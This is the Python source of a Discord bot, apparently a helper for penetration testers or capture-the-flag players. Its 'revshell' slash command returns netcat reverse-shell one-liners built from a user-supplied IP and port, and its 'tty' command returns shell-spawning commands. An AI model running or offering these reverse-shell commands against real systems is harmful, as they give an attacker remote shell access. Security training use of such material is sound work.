######  Copyright 2023 Daniel Tomov  #######
import discord
import os

from dotenv import load_dotenv
load_dotenv()
TOKEN = os.getenv('TOKEN')

### Register intents and client ###
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

### Slash Commands ###
tree = discord.app_commands.CommandTree(client=client)
servers = [discord.Object(id=1160247666870075422), discord.Object(id=923420517560627272)]

@tree.command(name="ping", description="Gives latency between you and the bot", guilds=servers)
async def ping(interaction):
    await interaction.response.send_message(f'Pong: {round(client.latency, 3)}ms', ephemeral=True)

@tree.command(name="revshell", description="Get a reverse shell", guilds=servers)
async def modulus(interaction, ip_address: str, port: int):
    await interaction.response.send_message(f"""
                                            Don't forget ```bash\nnc -lnvp {port}\n```
                                            https://www.revshells.com/
                                            ```bash\nnc {ip_address} {port} -e sh```
                                            ```bash\nnc -c sh {ip_address} {port}```
                                            ```bash\nncat {ip_address} {port} -e sh```
                                            """.replace("    ", ""), ephemeral=True)

@tree.command(name="tty", description="Get a TTY Shell", guilds=servers)
async def tty(interaction):
    await interaction.response.send_message(f"""
                                            ```bash\npython -c 'import pty; pty.spawn("/bin/sh")'```
                                            ```bash\necho 'os.system('/bin/bash')'```
                                            ```bash\n/bin/sh -i```
                                            """.replace("    ", ""), ephemeral=True)

@tree.command(name="github", description="DinoBot Github", guilds=servers)
async def modulus(interaction):
    await interaction.response.send_message("https://github.com/Daniel-Tomov/DinoBot", ephemeral=True)

### Listeners ###

@client.event
async def on_ready():
    for server in servers:
        await tree.sync(guild=server)
    print(f'{client.user} is ready and listening')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!hello'):
        await message.channel.send('Hello!')


### Functions ###
async def presense():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='John Hammond'))

client.run(token=TOKEN)